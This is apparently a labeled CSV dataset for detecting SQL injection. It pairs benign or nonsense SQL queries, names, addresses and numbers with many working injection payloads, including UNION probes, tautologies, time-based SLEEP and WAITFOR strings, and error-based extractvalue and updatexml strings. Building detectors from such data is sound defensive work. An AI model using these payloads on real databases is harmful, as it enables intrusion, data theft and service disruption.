Query,Label
alternat,0
"SELECT caught, win+ ', ' + seed+ ' ' + machinery+ ', ' + floor AS waste  FROM consider",0
SELECT COUNT ( highestID ) FROM cry,0
SELECT * FROM individual WHERE situation NOT LIKE 'ship%',0
"-5438""  )   UnIoN AlL SElECT 3170,3170--",1
SELECT * FROM mood WHERE field = 'fed',0
bscones de ojeda,0
SELECT * FROM  ( SELECT say FROM fire ),0
"SELECT activity,rod,mile,least,truck     (  (  swing JOIN count ON laugh.yes =  say.good )   INNER JOIN shopON Orders.fur =  shine.pupilID )",0
"1 wHeRe 6119  =  6119 oR 2367  =    (  SEleCt count  (  *  )   froM rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4  )  --",1
"1   )    )     )   oR 4411  =    (  sElECt count  (  *  )   fRom sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7  )   aNd    (    (     (  9255  =  9255",1
SELECT * FROM necessary WHERE due BETWEEN thee09/01/1996window AND led15/31/1996stone,0
"1%""  )   aND 5556  =    (  SElEct count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   aND   (  ""%""  =  """,1
SELECT * FROM told WHERE needed  BETWEEN 10 AND 20,0
"sElECT * FRoM users wHErE id  =  1 oR 1#""$ UNIoN sElECT VeRSiOn  (    )  ,VeRSiOn  (    )   -- 1",1
-4057'  )   ORdeR by 1#,1
8.45E+15,0
1'+  (  seleCt 'mquh' WhEre 3933  =  3933,1
ushiahua,0
selECt   (  cAsE WhEn   (  3365  =  6236  )   tHen 3365 elsE 1/  (  selECt 0  )   end  )  --,1
"SELECT include, voice, ate FROM please WHERE can  IS NULL",0
"1'||  (  seLEcT 'asfl' fRoM dual whEre 5846  =  5846 oR 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
-8513' uNIon alL sELECT 7414--,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5940 )  ORDER BY meta_id ASC",0
5.56841E+15,0
57584234p,0
1'+  (  seLect echl WHEre 6593  =  6593 rlike   (  seLect * From   (  seLect  (  SLeEP  (  5   )    )     )  vwyq  )  #,1
3040,0
"SELECT COUNT ( dull ) , careful FROM fort BY generally",0
"-3666""   )    )     )   UniOn ALL seleCt 4136,4136,4136--",1
7.73869E+15,0
11690,0
"1'+  (  seleCt 'utlx' whEre 6256  =  6256 Or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleCt   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",1
17850,0
SELECT * FROM not WHERE warn NOT LIKE '[tin]%',0
OR 'something'   =   'some'+'thing',1
"SELECT boy, sky+ ', ' + send+ ' ' + label+ ', ' + speed AS image  FROM birthday",0
evarist arnus 5 11-d,0
"1'||  (  SeLEcT 'xsoq' fROM dual WHERe 6690  =  6690 AnD 6510  =    (  SeLEcT count  (  *  )   fROM sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7   )    )   ||'",1
"ruiz de alda, 78",0
1'   )    )    and   (  SELecT * FROm   (  SELecT  (  sleEP  (  5   )    )     )  gcrr  )  #,1
"c/ del ferrocarril, 152,",0
1'   )    )    anD 3814  =  4272--,1
4.64693E+15,0
mocej*n,0
SELECT COUNT ( struck )  FROM teach,0
SELECT * FROM news WHERE where  BETWEEN 10 AND 20,0
"-5972"" OR 8509  =  3448#",1
SelEct * FROm users Where id  =  1 <@. or 1  =  1 -- 1,1
1   )    )    aS tnhy Where 1874  =  1874 And 2858  =  7324#,1
FROM  ( SELECT DISTINCT return FROM call ),0
SELECT * FROM color,0
SELECT tax FROM missing,0
-7277   )    )     )   ORDER BY 1#,1
SELECT life FROM bar,0
SELECT AVG ( thread )  FROM money  SELECT SUM ( name ),0
(  SelEcT * FROm   (  SelEcT  (  sLEep  (  5   )    )     )  srmq  ),1
"1"" WHEre 9792  =  9792 rlike   (  SeLeCt * FrOm   (  SeLeCt  (  SLeeP  (  5   )    )     )  vwyq  )  #",1
"SeLECT count  (  *  )   fROM rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4 And ""fkdx"" Like ""fkdx",1
1'+  (  SelecT 'dhcv' whERE 9372  =  9372,1
"-7382'   )    )    Or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' liKE 'tvaz",1
marcano giner,0
acrianzada,0
4350,0
"1   )    )     )   ANd 8148  =  lIkE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
pettinge,0
SELECT TOP 3 * FROM silly WHERE supper = 'wet' SELECT * FROM bill,0
SELECT COUNT ( disappear )  FROM excited,0
"SELECT blueID AS ID, seven AS classroom FROM acres",0
masferr massans,0
spradlin@pcvirus.dz,0
SELECT environment ( s ) FROM future INNER JOIN,0
"SELECT skin,brass,smaller FROM dug LEFT JOIN Orders ON coast.neverID =  adjective.stronger ORDER BY chicken.two",0
-2374  )   oR 2724 iN    (    (   chaR  (  113  )  +chaR  (  113  )  +chaR  (  112  )  +chaR  (  106  )  +chaR  (  113  )  +  (  sELECt   (  CASe whEN   (  2724  =  2724  )   THeN chaR  (  49  )   elsE chaR  (  48  )   enD   )    )   +chaR  (  113  )  +chaR  (  122  )  +chaR  (  118  )  +chaR  (  122  )  +chaR  (  113   )    )     )   AnD   (  2576  =  2576,1
"1%' aNd cHar  (  111  )  ||cHar  (  77  )  ||cHar  (  121  )  ||cHar  (  88  )    =  regexp_substring  (  repeat  (  LEFt  (  crypt_key  (  cHar  (  65  )  ||cHar  (  69  )  ||cHar  (  83  )  ,NuLL  )  ,0  )  ,500000000  )  ,NuLL  )   aNd '%'  =  '",1
pitcavag,0
"iif  (  9875  =  8961,1,1/0  )",1
SELECT * FROM fog WHERE square  BETWEEN 10 AND 20,0
"1' And 4241  =  cONVERT  (  int,  (  SeLEct cHaR  (  113  )  +cHaR  (  113  )  +cHaR  (  112  )  +cHaR  (  106  )  +cHaR  (  113  )  +  (  SeLEct   (  cASe WHEN   (  4241  =  4241  )   tHEN cHaR  (  49  )   eLSe cHaR  (  48  )   eNd   )    )   +cHaR  (  113  )  +cHaR  (  122  )  +cHaR  (  118  )  +cHaR  (  122  )  +cHaR  (  113   )    )     )",1
"1'  )   And 6414  =    (  sELEcT count  (  *  )   frOm rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4  )",1
(  SeLect   (  cASE WHeN   (  6986  =  6986  )   theN 6986 eLSe 6986*  (  SeLect 6986 fROm mysql.db  )   ENd   )    ),1
7770,0
"INSERT INTO steady  ( harder, football, needs )  VALUES  ( 'troops', 'her', 'feed' )",0
"-7008'   )    )    uNiON aLL seLEcT 9080,9080,9080#",1
"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",1
"1' IN boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchMarK  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",1
UPDATE pie SET prize = 'nodded'WHERE coal = 'under',0
"SELECT Orders.againrID, Employees.might, Employees.religious FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fightID ORDER BY Orders.structureID",0
SELECT * FROM castle FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT TOP 3 * FROM swing WHERE crew = 'feed',0
"SELECT bone, paper+ ', ' + cookies+ ' ' + upper+ ', ' + meat AS bare  FROM this",0
1   )    )    aS dgso wHeRe 4654  =  4654 ANd 2853  =  cAst   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  SELeCt   (  cASe wheN   (  2853  =  2853  )   Then 1 Else 0 End   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aS numeric  )  --,1
SELECT * FROM seed WHERE hot = 'lovely'  OR conversation = 'century',0
"c/ el breton, 187",0
"jose gomez gallito, 107,",0
hembrick,0
"1  )   OR 1022  =    (  SeLect count  (  *  )   FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
tsoucas,0
SELECT * FROM women WHERE    NOT group = 'verb',0
"sierra santos, 71, 6?g",0
SELECT * FROM studied  WHERE edge = bow,0
1'||  (  Select 'uedk' WhERe 4655  =  4655,1
"SELECT hornID AS ID, determine AS pay FROM show",0
ayca mols,0
91436910l,0
SELECT * FROM over 3 SELECT * FROM product,0
$  (  sLEep 50  ),1
"1',  (  SeLECt   (  cASe whEn   (  2073  =  5314  )   THen 1 else 1/  (  SeLECt 0  )   End   )    )",1
"-5903%""   )    )     )   Or 3038  =  3038",1
"1' anD 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELECt   (  cASE whEn   (  6055  =  6055  )   theN 1 eLse 0 END  )   FRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anD 'cgbf' LiKE 'cgbf",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2766' LIMIT 1,0
1'  )   oR SLeEP  (  5  )   AnD   (  'mdmr' lIkE 'mdmr,1
"-6368   )    )    uNion ALL SElECT 4646,4646,4646,4646,4646,4646,4646--",1
"1""   )    )    rlike SLeEp  (  5  )   AND    (    (   ""fzlr""  =  ""fzlr",1
"SeLeCT count  (  *  )   froM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 anD    (    (   '%'  =  '",1
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,0
1 whEre 6494  =  6494 ANd 8463  =  2760,1
dominguez@comercioenlacalle.hn,0
frades,0
"1%' or 8384  =  liKE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    And '%'  =  '",1
"SELECT * FROM fruit WHERE winter BETWEEN ""shoot"" AND    ""tape""",0
-3540 wHERe 7302  =  7302 OR 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeLecT   (  CAsE WHen   (  4493  =  4493  )   THeN 1 else 0 enD  )   fRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-3775'  )   AS rqet wHErE 7092  =  7092 or elt  (  1032  =  1032,3623  )  --",1
SELECT * FROM band FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM black,0
seLEct * fROm users WhErE id  =  '1' OR !<@ OR 1  =  1 -- 1',1
"1'  )   AND   (  selEcT 9067 fRoM  (  selEcT count  (  *  )  ,concat  (  0x7171706a71,  (  selEcT   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x fRoM information_schema.character_sets GrOUp by x  )  a  )",1
"-6492'  )   UNION aLL select 7204,7204--",1
SELECT * FROM coal ORDER BY beside DESC,0
"SELECT chapter, fall, edge FROM its WHERE wall  IS NULL",0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367577 ),0
"1%'  )   oR 8514  =  benCHmArk  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT * FROM limited FETCH FIRST 3 ROWS ONLY,0
urea bernat,0
"1%' AND elt  (  1210  =  1210,SLeeP  (  5   )    )    AND '%'  =  '",1
brias,0
"-6731"" wherE 6166  =  6166 Union all SeLeCt 6166,6166,6166,6166,6166,6166--",1
SELECT MIN ( list )  AS enjoy FROM happened,0
SELECT AVG ( source ) FROM these,0
SELECT * FROM someone FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( public ) FROM to,0
"1""  )   ANd elt  (  1210  =  1210,SlEep  (  5   )    )    ANd   (  ""cwwv"" LIke ""cwwv",1
SELECT column_name AS alias_name FROM table_name;,0
84446214n,0
"admin""  )   oR ""1""  =  ""1""--",1
"SELECT * FROM good WHERE at NOT IN  ( 'share', 'kids', 'frozen' )",0
SELECT * FROM Customers ORDER BY CustomerName DESC;,0
SELECT * FROM are FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM mix WHERE    NOT die = 'ask',0
1'   )    )    aNd 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SElEcT   (  CaSE wheN   (  4386  =  4386  )   tHeN 1 elSe 0 end  )   fROM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aNd    (    (   'jryo'  =  'jryo,1
SELECT * FROM minute WHERE story = 'student'  AND City = 'bill',0
"1""   )    )    As vdbf WHEre 7969  =  7969 Or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  SeLecT   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"1  )   As otsb wheRe 8380  =  8380 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1%""   )    )    or sleep  (  5  )   anD    (    (   ""%""  =  """,1
DELETE FROM organization,0
1 WHEre 7055  =  7055,1
"1   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  BENcHmaRK  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   ANd    (    (   4348  =  4348",1
"SelECt * From users where id  =  '1' or !<@ UnIOn SelECt 1,vErsIoN  (    )   -- 1'",1
SELECT * FROM market WHERE road = 'long' LIMIT 3,0
1120,0
"1"" uNioN aLL sElECT NULL,NULL#",1
"SELecT sLeEp  (  5  )   AND ""%""  =  """,1
dearly@evelin.ge,0
SELECT * FROM bell WHERE you = 'nodded'  OR use = 'gave',0
"1'||  (  SELecT 'cjwx' FroM dual WhERe 7637  =  7637 ANd elt  (  9548  =  3991,3991   )    )   ||'",1
jed,0
"-6412   )    )    as cnfs whEre 6557  =  6557 UNiON aLL seLEcT 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1
darcange1,0
3.29E+15,0
"SELECT * FROM eat ORDER BY forest, alone",0
SELECT * FROM plenty FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT flew ( s )  FROM only UNION,0
"-5478""  )   wHeRE 4100  =  4100 OR 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SelECT   (  case WHEN   (  4747  =  4747  )   Then 1 eLSE 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
barby,0
-6984 ORDeR bY 1#,1
"INSERT INTO example  ( count, from, nor )  VALUES  ( 'blew', 'farm', 'silence' )",0
asia,0
"-9596  )   WHeRE 3425  =  3425 union aLL sElEcT 3425,3425,3425,3425,3425,3425#",1
"1""  )   WHerE 5850  =  5850 Or 1022  =    (  SElECt count  (  *  )   frOm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
harold_veigel@ilusionarium.sk,0
"1'   )    )    Or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  SElEct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   AND    (    (   'gydh'  =  'gydh",1
SELECT * FROM entire WHERE rather BETWEEN '1996-07-01' AND '1996-07-31',0
oti sineiro,0
SELECT * FROM children 3 SELECT * FROM desert,0
"1  )   aS xuvz wherE 3061  =  3061 Or 2367  =    (  sELeCt count  (  *  )   FRom rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4  )  --",1
1'  )   AND 6240  =    (  'qqpjq'||  (  seLECt cAsE 6240 WHen 6240 ThEN 1 ElSe 0 end From rdb$DataBase  )  ||'qzvzq'  )   AND   (  'vhqm'  =  'vhqm,1
SELECT DISTINCT everything FROM rear,0
SELECT hard ( s )  FROM off FULL OUTER JOIN,0
SELECT * FROM yet WHERE point NOT LIKE 'breeze%',0
(  sElect * fRoM   (  sElect  (  SlEEp  (  5   )    )     )  srmq  )   aNd   (  'pgth'  =  'pgth,1
1' WherE 3900  =  3900 ANd 3715 in    (    (   ChAR  (  113  )  +ChAR  (  113  )  +ChAR  (  112  )  +ChAR  (  106  )  +ChAR  (  113  )  +  (  seLECT   (  CaSe whEN   (  3715  =  3715  )   TheN ChAR  (  49  )   Else ChAR  (  48  )   eND   )    )   +ChAR  (  113  )  +ChAR  (  122  )  +ChAR  (  118  )  +ChAR  (  122  )  +ChAR  (  113   )    )     )  --,1
"-8506'   )    )     )   UnIOn All SELect 1950,1950,1950,1950,1950,1950--",1
64633352v,0
des7768ab9e6os,0
lev@ozlon.ke,0
SELECT nuts ( s ) FROM else INNER JOIN,0
SELECT * FROM Customers  WHERE Country = 'Germany' AND City = 'Berlin';,0
bevis,0
SELECT TOP 3 * FROM tropical SELECT * FROM feel 3SELECT * FROM chair,0
"1'  )   ANd 4241  =  CoNVErt  (  int,  (  selECt Char  (  113  )  +Char  (  113  )  +Char  (  112  )  +Char  (  106  )  +Char  (  113  )  +  (  selECt   (  cAsE wHen   (  4241  =  4241  )   tHeN Char  (  49  )   else Char  (  48  )   end   )    )   +Char  (  113  )  +Char  (  122  )  +Char  (  118  )  +Char  (  122  )  +Char  (  113   )    )     )",1
SELECT * FROM smooth WHERE pie BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM pony WHERE perhaps = 'ship' FETCH FIRST 3 ROWS ONLY,0
"-5115"" UniOn all SeleCT 1642,1642,1642,1642,1642,1642,1642,1642--",1
SELECT COUNT ( DISTINCT swim )  FROM anything,0
SELECT * FROM egg  WHERE women NOT LIKE '[there]%',0
"1""  )   aS ghpx WHeRE 2873  =  2873 waitfor delay '0:0:5'--",1
"calle puebla de los infantes, 145",0
"SELECT MAKEDATE ( 2017, 3 ) ;",0
SELECT * FROM wp_posts WHERE ID  =  292420 LIMIT 1,0
"1%' ANd   (  SelecT 2*  (  if   (    (   SelecT * frOM   (  SelecT concat  (  0x7171706a71,  (  SelecT   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   ANd '%'  =  '",1
1  )   And 8417  =  5276#,1
"SelecT * FRom users Where id  =  1 OR $ 1  =  1 Union SelecT 1,@@VerSIoN -- 1",1
-2100' whErE 9260  =  9260 oR 3038  =  3038,1
alg59za,0
SELECT * FROM flame 3 SELECT * FROM roll,0
SELECT COUNT ( just )  FROM shoe,0
SELECT principal ( s )  FROM pocket FULL OUTER JOIN,0
SELECT AVG ( line ) FROM equipment,0
"1 And CHAr  (  120  )  ||CHAr  (  106  )  ||CHAr  (  117  )  ||CHAr  (  85  )    =  regexp_substring  (  repeat  (  rIGHt  (  CHAr  (  9981  )  ,0  )  ,5000000000  )  ,nULL  )  # jcdh",1
adolphe,0
47639,0
SELECT Count ( * )  AS official,0
agramontesa,0
"1""   )    )    As phis WhERE 4420  =  4420 AND 3202  =  LIke  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1%'   )    )    aNd row  (  6237,7469  )  >  (  seleCt count  (  *  )  ,concat  (  0x7171706a71,  (  seleCt   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  seleCt 5192 unioN seleCt 3785 unioN seleCt 3931 unioN seleCt 7158  )  a GRoUp by x  )   aNd    (    (   '%'  =  '",1
34830,0
barlovento,0
SELECT above FROM palace,0
arima@hormigon-impreso.nu,0
SELECT * FROM slip WHERE husband = 'free'  OR alive = 'did',0
SELECT * FROM want WHERE field LIKE '%farther%',0
1'  )   AND 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seLeCt   (  CAsE wHeN   (  4386  =  4386  )   TheN 1 elsE 0 end  )   FrOm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    AND   (  'jhlj'  =  'jhlj,1
SELECT COUNT ( bee ) FROM palace,0
"1%""   )    )     )   oR 9643  =    (  SELEct count  (  *  )   FRoM domain.domains AS t1,domain.columns AS t2,domain.tables AS t3  )   And    (    (     (  ""%""  =  """,1
3023,0
SELECT TOP 3 * FROM shot WHERE dry = 'welcome',0
"-3279"" uNion AlL seleCT 8568,8568,8568,8568--",1
dawson@eco-pro.to,0
"SEleCt count  (  *  )   FroM rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4 And   (  ""yobb"" LikE ""yobb",1
SELECT AVG ( pocket ) FROM air SELECT SUM ( complete ),0
"-6496""   )    )     )   oR 1471  =  5278 And    (    (     (  ""zkoj""  =  ""zkoj",1
"SELECT richID AS ID, influence AS rear FROM now",0
3u23pe,0
2.94331E+14,0
SELECT COUNT ( fly ) FROM series,0
"SELECT pond,row FROM native WHERE hold = 'threw' UNION SELECT buffalo, force FROM she",0
"""  )   OR pg_sleep  (  __TIME__  )  --",1
SELECT * FROM nearly WHERE hang = 'paper'  OR term = 'golden',0
rousseau,0
otxandio,0
SELECT troops ( s )  FROM nation SELECT blue FROM wise,0
san miguel del pino,0
SELECT * FROM forth WHERE missing = 'outer',0
"SELECT * FROM pleasure WHERE dust IN  ( 'desk', 'paragraph', 'famous' )",0
"INSERT INTO gradually ( teeth, surprise, different, visitor, know, habit )  VALUES  ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )",0
1   )    )    or pg_sleep  (  __TIME__  )  --,1
san bartolom,0
SELECT * FROM join WHERE NOT attached = 'wrong'  AND NOT remove = 'teach',0
"1'   )    )    As ydbt WHere 8062  =  8062 aNd 6414  =    (  SElECT count  (  *  )   fRoM rdb$fields As t1,rdb$types As t2,rdb$collations As t3,rdb$functions As t4  )  --",1
SELECT musical FROM topic,0
-5217 wHErE 3620  =  3620 Or 3440  =  cAsT   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seLecT   (  CaSE WHEn   (  3440  =  3440  )   tHen 1 ELsE 0 eND   )    )   ::tExt||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
glickman,0
"SELECT ADDDATE ( ""2017-06-15 09:34:21"", INTERVAL -3 HOUR ) ;",0
SELECT * FROM brain WHERE activity NOT LIKE 'bush%',0
"SELECT should, composed+ ', ' + military+ ' ' + cat+ ', ' + teach AS facing  FROM stopped",0
abs hosta,0
SELECT MIN ( mud )  AS parallel FROM around,0
"-9408%""   )    )    UNIOn aLL sElEct 1841,1841,1841,1841,1841,1841--",1
"1"" wHeRE 3692  =  3692 UnIOn ALL SelECT nUlL,nUlL--",1
"iif  (  9007  =  3836,1,1/0  )",1
SELECT * FROM discover  WHERE studying = test,0
"1%"" and 9254  =    (  sElECt count  (  *  )   FrOM rdb$fields AS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions AS t4  )  --",1
8.93682E+15,0
"1'   )    )    AS umah WHeRe 3781  =  3781 uniOn aLl selEct NuLl,NuLl,NuLl,NuLl#",1
1  )   WheRE 1090  =  1090 AnD 6240  =    (  'qqpjq'||  (  sElecT CaSE 6240 whEn 6240 Then 1 elSe 0 END frOM rdb$DATaBAse  )  ||'qzvzq'  )  --,1
0x730065006c0065006300740020004000400076006500 ...,1
sElEcT   (  CAse wHen   (  3677  =  2193  )   THeN 3677 Else 1/  (  sElEcT 0  )   enD  )  --,1
SELECT * FROM alone WHERE never BETWEEN act09/01/1996say AND keep15/31/1996meat,0
SELECT COUNT ( giveID ) FROM neighborhood,0
"seLECT * FroM users WHErE id  =  1 or \<\ uNIon seLECT 1,@@VeRSION -- 1",1
"1""  )   As gffq whEre 4387  =  4387 oR extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  sElEcT   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
0e06u8s17,0
SELECT COUNT ( moonID ) FROM shoulder,0
55585768n,0
SElect   (  cASe wHEN   (  7163  =  1777  )   thEN 1 ELse 7163*  (  SElect 7163 FROm master..sysdatabases  )   enD  )  --,1
"SELECT paint, swimming, labor FROM wire WHERE closely  IS NULL",0
"call regexp_substring  (  repeat  (  RIghT  (  chaR  (  3702  )  ,0  )  ,500000000  )  ,NUlL  )   anD    (    (     (  'leps' lIkE 'leps",1
guino osarte,0
"-3249'   )    )     )   unIoN All selecT 6309,6309#",1
26562587w,0
"1'   )    )     )   UnIoN aLL SeLeCT NULl,NULl,NULl,NULl,NULl--",1
SELECT * FROM buffalo WHERE Price NOT BETWEEN 10 AND 20,0
valdeprados,0
select * frOm users WhErE id  =  1 <@ OR 1  =  1 -- 1,1
3.15402E+15,0
armaanzas,0
"1""  )   as bllz wHerE 6975  =  6975 ANd 8148  =  LIke  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"SELECT CustomerName, ContactName FROM Customers WHERE  Country  =  ""Brazil"";",0
"1 And elt  (  4249  =  4249,7259  )  # lwyo",1
"1' uNiON ALl SeLECt nULL,nULL,nULL,nULL,nULL,nULL,nULL,nULL,nULL--",1
seLEct   (  CAsE wheN   (  1776  =  7688  )   tHeN 1776 else 1/  (  seLEct 0  )   end  )  --,1
SELECT TOP 50 PERCENT * FROM across SELECT * FROM agree FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0
"1"" WhERE 1982  =  1982",1
SELECT SIGN ( -12 ) ;,0
"1'||  (  SeleCT 'fbtm' WheRe 1335  =  1335 AND exp  (  ~  (  SeleCT * FrOM   (  SeleCT concat  (  0x7171706a71,  (  SeleCT   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
1'||  (  seleCT 'xglm' FROm dual wHere 3556  =  3556 or 4240  =    (  seleCT 4240 FROm pg_sleep  (  5   )    )   --,1
5632,0
grueneic,0
6.96678E+15,0
"SELECT DAYOFYEAR ( ""2017-01-01"" ) ;",0
"1'   )    )    AS kgiw WhErE 7452  =  7452 AND 6510  =    (  sElect count  (  *  )   frOM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7  )  --",1
"sElEcT count  (  *  )   fRom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 And    (    (   ""soyg""  =  ""soyg",1
"SELECT scaredID AS ID, jungle AS rice FROM carefully",0
werkmeister@19horas.zr,0
5.25502E+15,0
SELECT AVG ( ready ) FROM pure SELECT SUM ( chapter ),0
SELECT * FROM thread WHERE    NOT eleven = 'worse',0
"1"" wHerE 6785  =  6785 ANd 3580  =    (  SELECt count  (  *  )   From domain.domains AS t1,domain.columns AS t2,domain.tables AS t3  )  --",1
"-9208%""   )    )    or 8571  =  8571--",1
SELECT * FROM smooth WHERE lungs = 'gone',0
SELECT * FROM suit  WHERE brush = travel,0
lovejoy,0
